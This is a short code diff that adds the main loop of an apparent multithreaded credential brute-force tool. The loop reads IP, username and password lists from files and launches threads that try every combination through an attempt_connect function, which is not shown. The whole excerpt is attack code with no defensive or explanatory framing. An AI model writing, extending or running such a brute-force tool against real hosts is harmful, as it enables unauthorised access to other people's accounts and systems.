@@ -40,4 +40,27 @@ def main():
     user_list_file = "user_list.txt"
     password_list_file = "password_list.txt"
 
-    ip_list = [ipaddress.ip_address(ip.strip()) for ip
+    ip_list = [ipaddress.IPv4Address(ip.strip()) for ip in read_file(ip_list_file)]
+    user_list = read_file(user_list_file)
+    password_list = read_file(password_list_file)
+
+    threads_args = []
+
+    for ip in ip_list:
+        for user in user_list:
+            for password in password_list:
+                if len(threads_args) >= MAX_THREADS:
+                    for args in threads_args:
+                        t = threading.Thread(target=attempt_connect, args=(args,))
+                        t.start()
+                    threads_args.clear()
+                threads_args.append(BruteForceArgs(ip, user, password))
+
+    for args in threads_args:
+        t = threading.Thread(target=attempt_connect, args=(args,))
+        t.start()
+
+    draw_ui()
+
+if __name__ == "__main__":
+    main()
